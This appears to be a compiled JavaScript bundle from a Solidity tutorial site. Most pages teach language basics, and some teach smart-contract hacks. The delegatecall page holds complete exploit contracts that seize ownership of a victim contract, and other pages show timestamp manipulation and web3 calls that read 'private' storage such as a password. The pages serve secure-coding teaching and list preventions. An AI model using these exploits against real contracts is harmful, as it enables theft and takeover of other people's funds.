i.a.createElement(P,{version:"0.6.10",title:"Delegatecall",description:"An example of exploits using delegatecall in Solidity",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>delegatecall</code> is tricky to use and wrong usage or incorrect understanding\ncan lead to devastating results.</p>\n<p>You must keep 2 things in mind when using <code>delegatecall</code></p>\n<ol>\n<li><code>delegatecall</code> preserves context (storage, caller, etc...)</li>\n<li>storage layout must be the same for the contract calling <code>delegatecall</code> and the contract getting called</li>\n</ol>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nHackMe is a contract that uses delegatecall to execute code.\nIt it is not obvious that the owner of HackMe can be changed since there is no\nfunction inside HackMe to do so. However an attacker can hijack the\ncontract by exploiting delegatecall. Let&#39;s see how.\n\n1. Alice deploys Lib\n2. Alice deploys HackMe with address of Lib\n3. Eve deploys Attack with address of HackMe\n4. Eve calls Attack.attack()\n5. Attack is now the owner of HackMe\n\nWhat happened?\nEve called Attack.attack().\nAttack called the fallback function of HackMe sending the function\nselector of pwn(). HackMe forwards the call to Lib using delegatecall.\nHere msg.data contains the function selector of pwn().\nThis tells Solidity to call the function pwn() inside Lib.\nThe function pwn() updates the owner to msg.sender.\nDelegatecall runs the code of Lib using the context of HackMe.\nTherefore HackMe&#39;s storage was updated to msg.sender where msg.sender is the\ncaller of HackMe, in this case Attack.\n*/\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) public {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) public {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature("pwn()"));\n    }\n}</code></pre>\n<p>Here is another example.</p>\n<p>You will need to understand how Solidity stores\nstate variables before you can understand this exploit.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nThis is a more sophisticated version of the previous exploit.\n\n1. Alice deploys Lib and HackMe with the address of Lib\n2. Eve deploys Attack with the address of HackMe\n3. Eve calls Attack.attack()\n4. Attack is now the owner of HackMe\n\nWhat happened?\nNotice that the state variables are not defined in the same manner in Lib\nand HackMe. This means that calling Lib.doSomething() will change the first\nstate variable inside HackMe, which happens to be the address of lib.\n\nInside attack(), the first call to doSomething() changes the address of lib\nstore in HackMe. Address of lib is now set to Attack.\nThe second call to doSomething() calls Attack.doSomething() and here we\nchange the owner.\n*/\n\ncontract Lib {\n    uint public someNumber;\n\n    function doSomething(uint _num) public {\n        someNumber = _num;\n    }\n}\n\ncontract HackMe {\n    address public lib;\n    address public owner;\n    uint public someNumber;\n\n    constructor(address _lib) public {\n        lib = _lib;\n        owner = msg.sender;\n    }\n\n    function doSomething(uint _num) public {\n        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));\n    }\n}\n\ncontract Attack {\n    // Make sure the storage layout is the same as HackMe\n    // This will allow us to correctly update the state variables\n    address public lib;\n    address public owner;\n    uint public someNumber;\n\n    HackMe public hackMe;\n\n    constructor(HackMe _hackMe) public {\n        hackMe = HackMe(_hackMe);\n    }\n\n    function attack() public {\n        // override address of lib\n        hackMe.doSomething(uint(address(this)));\n        // pass any number as input, the function doSomething() below will\n        // be called\n        hackMe.doSomething(1);\n    }\n\n    // function signature must match HackMe.doSomething()\n    function doSomething(uint _num) public {\n        owner = address(this);\n    }\n}\n</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Use stateless <code>Library</code></li>\n</ul>\n'})}},{path:"/0.6/hacks/block-timestamp-manipulation",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Block Timestamp Manipulation",description:"An example of a Solidity contract vulnerable to block timestamp manipulation",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p><code>block.timestamp</code> can be manipulated by miners with the following constraints</p>\n<ul>\n<li>it cannot be stamped with an earlier time than its parent</li>\n<li>it cannot be too far in the future</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nRoulette is a game where you can win all of the Ether in the contract\nif you can submit a transaction at a specific timing.\nA player needs to send 10 Ether and wins if the block.timestamp % 15 == 0.\n*/\n\n/*\n1. Deploy Roulette with 10 Ether\n2. Eve runs a powerful miner that can manipulate the block timestamp.\n3. Eve sets the block.timestamp to a number in the future that is divisible by\n   15 and finds the target block hash.\n4. Eve&#39;s block is successfully included into the chain, Eve wins the\n   Roulette game.\n*/\n\ncontract Roulette {\n    uint public pastBlockTime;\n\n    constructor() public payable {}\n\n    function spin() external payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n        require(now != pastBlockTime); // only 1 transaction per block\n\n        pastBlockTime = block.timestamp;\n\n        if(now % 15 == 0) {\n            (bool sent, ) = msg.sender.call{value: address(this).balance}("");\n            require(sent, "Failed to send Ether");\n        }\n    }\n}</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t use <code>block.timestamp</code> for a source of entropy and random number</li>\n</ul>\n'})}},{path:"/0.6/hacks/accessing-private-data",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Accessing Private Data",description:"An example of accessing private data from a Solidity smart contract",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>All data on a smart contract can be read.</p>\n<p>Let&#39;s see how we can read <code>private</code> data. In the process you will learn how Solidity stores state variables.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n/*\nNote: cannot use web3 on JVM, so use the contract deployed on ropsten\nNote: browser Web3 is old so use Web3 from truffle console\n\nContract deployed on Ropsten\n0x3505a02BCDFbb225988161a95528bfDb279faD6b\n*/\n\n/*\n# Storage\n- 2 ** 256 slots\n- 32 bytes for each slot\n- data is stored sequentially in the order of declaration\n- storage is optimized to save space. If neighboring variables fit in a single\n  32 bytes, then they are packed into the same slot, starting from the right\n*/\n\ncontract Vault {\n    // slot 0\n    uint public count = 123;\n    // slot 1\n    address public owner = msg.sender;\n    bool public isTrue = true;\n    uint16 public u16 = 31;\n    // slot 2\n    bytes32 private password;\n\n    // constants do not use storage\n    uint public constant someConst = 123;\n\n    // slot 3, 4, 5 (one for each array element)\n    bytes32[3] public data;\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 6 - length of array\n    // starting from slot hash(6) - array elements\n    // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n    // where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))\n    User[] private users;\n\n    // slot 7 - empty\n    // entries are stored at hash(key, slot)\n    // where slot = 7, key = map key\n    mapping(uint =&gt; User) private idToUser;\n\n    constructor(bytes32 _password) public {\n        password = _password;\n    }\n\n    function addUser(bytes32 _password) public {\n        User memory user = User({\n            id: users.length,\n            password: _password\n        });\n\n        users.push(user);\n        idToUser[user.id] = user;\n    }\n\n    function getArrayLocation(uint slot, uint index, uint elementSize) public pure returns (uint) {\n        return uint(keccak256(abi.encodePacked(slot))) + (index * elementSize);\n    }\n\n    function getMapLocation(uint slot, uint key) public pure returns (uint) {\n        return uint(keccak256(abi.encodePacked(key, slot)));\n    }\n}\n\n/*\nslot 0 - count\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 0, console.log)\nslot 1 - u16, isTrue, owner\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 1, console.log)\nslot 2 - password\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", 2, console.log)\n\nslot 6 - array length\ngetArrayLocation(6, 0, 2)\nweb3.utils.numberToHex("111414077815863400510004064629973595961579173665589224203503662149373724986687")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: "uint", value: 6 })\n1st user\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d40", console.log)\nNote: use web3.toAscii to convert bytes32 to alphabet\n2nd user\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d41", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d42", console.log)\n\nslot 7 - empty\ngetMapLocation(7, 1)\nweb3.utils.numberToHex("81222191986226809103279119994707868322855741819905904417953092666699096963112")\nNote: We can also use web3 to get data location\nweb3.utils.soliditySha3({ type: "uint", value: 1 }, {type: "uint", value: 7})\nuser 1\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b828", console.log)\nweb3.eth.getStorageAt("0x3505a02BCDFbb225988161a95528bfDb279faD6b", "0xb39221ace053465ec3453ce2b36430bd138b997ecea25c1043da0c366812b829", console.log)\n*/</code></pre>\n<h3 id="preventative-techniques">Preventative Techniques</h3>\n<ul>\n<li>Don&#39;t store sensitive information on the blockchain.</li>\n</ul>\n'})}},{path:"/0.6/gas",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Gas",description:"Example of gas and gas limit in Solidity",html:'<h3 id="how-much-ether-do-you-need-to-pay-for-a-transaction">How much <code>ether</code> do you need to pay for a transaction?</h3>\n<p>You pay <code>gas spent * gas price</code> amount of <code>ether</code>, where</p>\n<ul>\n<li><code>gas</code> is a unit of computation</li>\n<li><code>gas spent</code> is the total amount of <code>gas</code> used in a transaction</li>\n<li><code>gas price</code> is how much <code>ether</code> you are willing to pay per <code>gas</code></li>\n</ul>\n<p>Transactions with higher gas price have higher priority to be included in a block.</p>\n<p>Unspent gas will be refunded.</p>\n<h3 id="gas-limit">Gas Limit</h3>\n<p>There are 2 upper bounds to the amount of gas you can spend</p>\n<ul>\n<li><code>gas limit</code> (max amount of gas your willing to use for your transaction, set by you)</li>\n<li><code>block gas limit</code> (max amount of gas allowed in a block, set by the network)</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Gas {\n    uint public i = 0;\n\n    // Using up all of the gas that you send causes your transaction to fail.\n    // State changes are undone.\n    // Gas spent are not refunded.\n    function forever() public {\n        // Here we run a loop until all of the gas are spent\n        // and the transaction fails\n        while(true) {\n            i += 1;\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/function-modifier",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Function Modifier",description:"Example of how to write function modifier in Solidity",html:'<p>Modifiers are code that can be run before and / or after a function call.</p>\n<p>Modifiers can be used to:</p>\n<ul>\n<li>Restrict access</li>\n<li>Validate inputs</li>\n<li>Guard against reentrancy hack</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract FunctionModifier {\n    // We will use these variables to demonstrate how to use\n    // modifiers.\n    address public owner;\n    uint public x = 10;\n    bool public locked;\n\n    constructor() public {\n        // Set the transaction sender as the owner of the contract.\n        owner = msg.sender;\n    }\n\n    // Modifier to check that the caller is the owner of\n    // the contract.\n    modifier onlyOwner() {\n        require(msg.sender == owner, "Not owner");\n        // Underscore is a special character only used inside\n        // a function modifier and it tells Solidity to\n        // execute the rest of the code.\n        _;\n    }\n\n    // Modifiers can take inputs. This modifier checks that the\n    // address passed in is not the zero address.\n    modifier validAddress(address _addr) {\n        require(_addr != address(0), "Not valid address");\n        _;\n    }\n\n    function changeOwner(address _newOwner)\n        public\n        onlyOwner\n        validAddress(_newOwner)\n    {\n        owner = _newOwner;\n    }\n\n    // Modifiers can be called before and / or after a function.\n    // This modifier prevents a function from being called while\n    // it is still executing.\n    modifier noReentrancy() {\n        require(!locked, "No reentrancy");\n\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function decrement(uint i) public noReentrancy {\n        x -= i;\n\n        if (i &gt; 1) {\n            decrement(i - 1);\n        }\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/function",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Function",description:"Example of how to write functions in Solidity",html:'<p>There are several ways to return outputs from a function.</p>\n<p>Public functions cannot accept certain data types as inputs or outputs</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Function {\n    // Functions can return multiple values.\n    function returnMany() public pure returns (uint, bool, uint) {\n        return (1, true, 2);\n    }\n\n    // Return values can be named.\n    function named() public pure returns (uint x, bool b, uint y) {\n        return (1, true, 2);\n    }\n\n    // Return values can be assigned to their name.\n    // In this case the return statement can be omitted.\n    function assigned() public pure returns (uint x, bool b, uint y) {\n        x = 1;\n        b = true;\n        y = 2;\n    }\n\n    // Use destructing assignment when calling another\n    // function that returns multiple values.\n    function destructingAssigments()\n        public pure returns (uint, bool, uint, uint, uint)\n    {\n        (uint i, bool b, uint j) =  returnMany();\n\n        // Values can be left out.\n        (uint x, , uint y) = (4, 5, 6);\n\n        return (i, b, j, x, y);\n    }\n\n    // Cannot use map for neither input nor output\n\n    // Can use array for input\n    function arrayInput(uint[] memory _arr) public {\n    }\n\n    // Can use array for output\n    uint[] public arr;\n\n    function arrayOutput() public view returns (uint[] memory) {\n        return arr;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/first-app",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"First Application",description:"Example of smart contract in Solidity",html:'<p>Here is a simple contract that you can get, increment and decrement the count store in this contract.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Counter {\n    uint public count;\n\n    // Function to get the current count\n    function get() public view returns (uint) {\n        return count;\n    }\n\n    // Function to increment count by 1\n    function inc() public {\n        count += 1;\n    }\n\n    // Function to decrement count by 1\n    function dec() public {\n        count -= 1;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/fallback",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Fallback",description:"Example of how to use fallback in Solidity",html:'<p>A <code>fallback function</code> is an anonymous function that does not take any arguments and does not return anything.</p>\n<p>Fallback functions are executed when</p>\n<ul>\n<li>calling a function that does not exist</li>\n<li>sending Ether directly to a contract</li>\n</ul>\n<p><code>Fallback</code> functions have a 2300 gas limit when called by <code>transfer</code> or <code>send</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Fallback {\n    event Log(uint gas);\n\n    // Fallback function must be declared as external.\n    fallback() external payable {\n        // send / transfer (forwards 2300 gas to this fallback function)\n        // call (forwards all of the gas)\n        emit Log(gasleft());\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract SendToFallback {\n    function transferToFallback(address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function callFallback(address payable _to) public payable {\n        (bool sent,) = _to.call{value: msg.value}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/events",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Events",description:"Example of how to emit events in Solidity",html:'<p><code>Events</code> allow logging to the Ethereum blockchain. Some use cass for events are:</p>\n<ul>\n<li>Listening for events and updating user interface</li>\n<li>A cheap form of storage</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Event {\n    // Event declaration\n    // Up to 3 parameters can be indexed.\n    // Indexed parameters helps you filter the logs by the indexed parameter\n    event Log(address indexed sender, string message);\n    event AnotherLog();\n\n    function test() public {\n        emit Log(msg.sender, "Hello World!");\n        emit Log(msg.sender, "Hello EVM!");\n        emit AnotherLog();\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/ether-units",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Ether and Wei",description:"An example of Ether and Wei in Solidity",html:'<p>Transactions are paid with <code>ether</code>.</p>\n<p>Similar to how one dollar is equal to 100 cent, one <code>ether</code> is equal to 10<sup>18</sup> <code>wei</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract EtherUnits {\n    uint public oneWei = 1 wei;\n    // 1 wei is equal to 1\n    bool public isOneWei = 1 wei == 1;\n\n    uint public oneEther = 1 ether;\n    // 1 ether is equal to 10^18\n    bool public isOneEther = 1 ether == 1e18;\n}\n</code></pre>\n'})}},{path:"/0.6/error",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Error",description:"Example of how to throw errors in Solidity",html:'<p>An error will undo all changes made to the state during a transaction.</p>\n<p>You can throw an error by calling <code>require</code>, <code>revert</code> or <code>assert</code>.</p>\n<ul>\n<li><code>require</code> is used to validate inputs and conditions before execution.</li>\n<li><code>revert</code> is similar to <code>require</code>. See the code below for details.</li>\n<li><code>assert</code> is used to check for code that should never be false. Failing\nassertion probably means that there is a bug.</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Error {\n    function testRequire(uint _i) public {\n        // Require should be used to validate conditions such as:\n        // - inputs\n        // - conditions before execution\n        // - return values from calls to other functions\n        require(_i &gt; 10, "Input must be greater than 10");\n    }\n\n    function testRevert(uint _i) public {\n        // Revert is useful when the condition to check is complex.\n        // This code does the exact same thing as the example above\n        if (_i &lt;= 10) {\n            revert("Input must be greater than 10");\n        }\n    }\n\n    uint public num;\n\n    function testAssert() public {\n        // Assert should only be used to test for internal errors,\n        // and to check invariants.\n\n        // Here we assert that num is always equal to 0\n        // since it is impossible to update the value of num\n        assert(num == 0);\n    }\n}\n</code></pre>\n<p>Here is another example</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Account {\n    uint public balance;\n    uint public constant MAX_UINT = 2 ** 256 - 1;\n\n    function deposit(uint _amount) public {\n        uint oldBalance = balance;\n        uint newBalance = balance + _amount;\n\n        // balance + _amount does not overflow if balance + _amount &gt;= balance\n        require(newBalance &gt;= oldBalance, "Overflow");\n\n        balance = newBalance;\n\n        assert(balance &gt;= oldBalance);\n    }\n\n    function withdraw(uint _amount) public {\n        uint oldBalance = balance;\n\n        // balance - _amount does not underflow if balance &gt;= _amount\n        require(balance &gt;= _amount, "Underflow");\n\n        if (balance &lt; _amount) {\n            revert("Underflow");\n        }\n\n        balance -= _amount;\n\n        assert(balance &lt;= oldBalance);\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/enum",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Enum",description:"Example of enums in Solidity",html:'<p>Solidity support enumerables and they are useful to model choice and keep track of state.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Enum {\n    // Enum representing shipping status\n    enum Status {\n        Pending,\n        Shipped,\n        Accepted,\n        Rejected,\n        Canceled\n    }\n\n    // Default value is the first element listed in\n    // definition of the type, in this case "Pending"\n    Status public status;\n\n    // Returns uint\n    // Pending  - 0\n    // Shipped  - 1\n    // Accepted - 2\n    // Rejected - 3\n    // Canceled - 4\n    function get() public view returns (Status) {\n        return status;\n    }\n\n    // Update status by passing uint into input\n    function set(Status _status) public {\n        status = _status;\n    }\n\n    // You can update to a specific enum like this\n    function cancel() public {\n        status = Status.Canceled;\n    }\n\n    // delete resets the enum to it&#39;s first value, 0\n    function reset() public {\n        delete status;\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/delegatecall",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Delegatecall",description:"Example of how to use deletegatecall in Solidity",html:'<p><code>delegatecall</code> is a low level function similar to <code>call</code>.</p>\n<p>When contract <code>A</code> executes <code>delegatecall</code> to contract <code>B</code>, <code>B</code>&#39;s code is excuted</p>\n<p>with contract <code>A</code>&#39;s storage, <code>msg.sender</code> and <code>msg.value</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n// NOTE: Deploy this contract first\ncontract B {\n    // NOTE: storage layout must be the same as contract A\n    uint public num;\n    address public sender;\n    uint public value;\n\n    function setVars(uint _num) public payable {\n        num = _num;\n        sender = msg.sender;\n        value = msg.value;\n    }\n}\n\ncontract A {\n    uint public num;\n    address public sender;\n    uint public value;\n\n    function setVars(address _contract, uint _num) public payable {\n        // A&#39;s storage is set, B is not modified.\n        (bool success, bytes memory data) = _contract.delegatecall(\n            abi.encodeWithSignature("setVars(uint256)", _num)\n        );\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/data-locations",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Data Locations - Storage, Memory and Calldata",description:"Data locations - storage, memory and calldata",html:'<p>Variables are declared as either <code>storage</code>, <code>memory</code> or <code>calldata</code> to explicitly\nspecify the location of the data.</p>\n<ul>\n<li><code>storage</code> - variable is a state variable (store on blockchain)</li>\n<li><code>memory</code> - variable is in memory and it exists while a function is being called</li>\n<li><code>calldata</code> - special data location that contains function arguments, only available for <code>external</code> functions</li>\n</ul>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract DataLocations {\n    uint[] public arr;\n    mapping(uint =&gt; address) map;\n    struct MyStruct {\n        uint foo;\n    }\n    mapping(uint =&gt; MyStruct) myStructs;\n\n    function f() public {\n        // call _f with state variables\n        _f(arr, map, myStructs[1]);\n\n        // get a struct from a mapping\n        MyStruct storage myStruct = myStructs[1];\n        // create a struct in memory\n        MyStruct memory myMemStruct = MyStruct(0);\n    }\n\n    function _f(\n        uint[] storage _arr,\n        mapping(uint =&gt; address) storage _map,\n        MyStruct storage _myStruct\n    ) internal {\n        // do something with storage variables\n    }\n\n    // You can return memory variables\n    function g(uint[] memory _arr) public returns (uint[] memory) {\n        // do something with memory array\n    }\n\n    function h(uint[] calldata _arr) external {\n        // do something with calldata array\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/constructor",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Constructor",description:"Learn how to initialize smart contracts in Solidity using a constructor",html:'<p>A <code>constructor</code> is an optional function that is executed upon contract creation.</p>\n<p>Here are examples of how to pass arguments to <code>constructors</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n// Base contract X\ncontract X {\n    string public name;\n\n    constructor(string memory _name) public {\n        name = _name;\n    }\n}\n\n// Base contract Y\ncontract Y {\n    string public text;\n\n    constructor(string memory _text) public {\n        text = _text;\n    }\n}\n\n// There are 2 ways to initialize parent contract with parameters.\n\n// Pass the parameters here in the inheritance list.\ncontract B is X("Input to X"), Y("Input to Y") {\n}\n\ncontract C is X, Y {\n    // Pass the parameters here in the constructor,\n    // similar to function modifiers.\n    constructor(string memory _name, string memory _text) X(_name) Y(_text) public {\n    }\n}\n\n// Parent constructors are always called in the order of inheritance\n// regardless of the order of parent contracts listed in the\n// constructor of the child contract.\n\n// Order of constructors called:\n// 1. Y\n// 2. X\n// 3. E\ncontract E is X, Y {\n    constructor() X("X was called") Y("Y was called") public {\n    }\n}\n\n// Order of constructors called:\n// 1. Y\n// 2. X\n// 3. E\ncontract F is X, Y {\n    constructor() Y("Y was called") X("X was called") public {\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/calling-contract",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Calling Other Contract",description:"In Solidity, contract can call other contracts in several ways",html:'<p>Contract can call other contracts in 2 ways.</p>\n<p>The easiest way to is to just call it, like <code>A.foo(x, y, z)</code>.</p>\n<p>Another way to call other contracts is to use the low-level <code>call</code>.</p>\n<p>This method is not recommended.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Callee {\n    uint public x;\n    uint public value;\n\n    function setX(uint _x) public returns (uint) {\n        x = _x;\n        return x;\n    }\n\n    function setXandSendEther(uint _x) public payable returns (uint, uint) {\n        x = _x;\n        value = msg.value;\n\n        return (x, value);\n    }\n}\n\ncontract Caller {\n    function setX(Callee _callee, uint _x) public {\n        uint x = _callee.setX(_x);\n    }\n\n    function setXFromAddress(address _addr, uint _x) public {\n        Callee callee = Callee(_addr);\n        callee.setX(_x);\n    }\n\n    function setXandSendEther(Callee _callee, uint _x) public payable {\n        (uint x, uint value) = _callee.setXandSendEther{value: msg.value}(_x);\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/call",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Call",description:"In Solidity call is a low level function to interact with other contracts",html:'<p><code>call</code> is a low level function to interact with other contracts.</p>\n<p>This is the recommended method to use when you&#39;re just sending Ether via calling the <code>fallback</code> function.</p>\n<p>However it is not the recommend way to call existing functions.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Receiver {\n    event Received(address caller, uint amount, string message);\n\n    receive() external payable {\n        emit Received(msg.sender, msg.value, "Fallback was called");\n    }\n\n    function foo(string memory _message, uint _x) public payable returns (uint) {\n        emit Received(msg.sender, msg.value, _message);\n\n        return _x + 1;\n    }\n}\n\ncontract Caller {\n    event Response(bool success, bytes data);\n\n    // Let&#39;s imagine that contract B does not have the source code for\n    // contract A, but we do know the address of A and the function to call.\n    function testCallFoo(address payable _addr) public payable {\n        // You can send ether and specify a custom gas amount\n        (bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000}(\n            abi.encodeWithSignature("foo(string,uint256)", "call foo", 123)\n        );\n\n        emit Response(success, data);\n    }\n\n    // Calling a function that does not exist triggers the fallback function.\n    function testCallDoesNotExist(address _addr) public {\n        (bool success, bytes memory data) = _addr.call(\n            abi.encodeWithSignature("doesNotExist()")\n        );\n\n        emit Response(success, data);\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/array",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Array",description:"Learn about arrays in Solidity",html:'<p>Array can have a compile-time fixed size or a dynamic size.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\ncontract Array {\n    // Several ways to initialize an array\n    uint[] public arr;\n    uint[] public arr2 = [1,2,3];\n    // Fixed sized array, all elements initialize to 0\n    uint[10] public myFixedSizeArr;\n\n    function get(uint i) public view returns (uint) {\n        return arr[i];\n    }\n\n    // Solidity can return the entire array.\n    // But this function should be avoided for\n    // arrays that can grow indefinitely in length.\n    function getArr() public view returns (uint[] memory) {\n        return arr;\n    }\n\n    function push(uint i) public {\n        // Append to array\n        // This will increase the array length by 1.\n        arr.push(i);\n    }\n\n    function pop() public {\n        // Remove last element from array\n        // This will decrease the array length by 1\n        arr.pop();\n    }\n\n    function getLength() public view returns (uint) {\n        return arr.length;\n    }\n\n    function remove(uint index) public {\n        // Delete does not change the array length.\n        // It resets the value at index to it&#39;s default value,\n        // in this case 0\n        delete arr[index];\n    }\n}\n\ncontract CompactArray {\n    uint[] public arr;\n\n    // Deleting an element creates a gap in the array.\n    // One trick to keep the array compact is to\n    // move the last element into the place to delete.\n    function remove(uint index) public {\n        // Move the last element into the place to delete\n        arr[index] = arr[arr.length - 1];\n        // Remove the last element\n        arr.pop();\n    }\n\n    function test() public {\n        arr.push(1);\n        arr.push(2);\n        arr.push(3);\n        arr.push(4);\n        // [1, 2, 3, 4]\n\n        remove(1);\n        // [1, 4, 3]\n\n        remove(2);\n        // [1, 4]\n    }\n}\n</code></pre>\n'})}},{path:"/0.6/app/uni-directional-payment-channel",component:function(){return i.a.createElement(P,{version:"0.6.10",title:"Uni-Directional Payment Channel",description:"An example of uni-directional payment channels in Solidity",html:'<p>Payment channels allow participants to repeatedly transfer Ether off chain.</p>\n<p>Here is how this contract is used:</p>\n<ul>\n<li><code>Alice</code> deploys the contract, funding it with some Ether.</li>\n<li><code>Alice</code> authorizes a payment by signing a message (off chain) and sends the signature to <code>Bob</code>.</li>\n<li><code>Bob</code> claims his payment by presenting the signed message to the smart contract.</li>\n<li>If <code>Bob</code> does not claim his payment, <code>Alice</code> get her Ether back after the contract expires</li>\n</ul>\n<p>This is called a uni-directional payment channel since the payment can go only in a signle direction from <code>Alice</code> to <code>Bob</code>.</p>\n<pre><code class="language-solidity">// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/cryptography/ECDSA.sol";\nimport "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/utils/ReentrancyGuard.sol";\n\n\ncontract UniDirectionalPaymentChannel is ReentrancyGuard {\n    using SafeMath for uint;\n    using ECDSA for bytes32;\n\n    address payable public payer;\n    address payable public payee;\n\n    uint public expiresAt;\n\n    constructor(address payable _payee, uint _expiresAt) public payable {\n        require(_expiresAt &gt; block.timestamp, "Expiration must be &gt; now");\n\n        payer = msg.sender;\n        payee = _payee;\n\n        expiresAt = _expiresAt;\n    }\n\n    function verify(\n        bytes memory _signature,\n        address _payer,\n        address _contract,\n        uint _payeeBalance\n    ) public pure returns (bool) {\n        // NOTE: sign with address of this contract to protect agains\n        // replay attack on other contracts\n        return\n            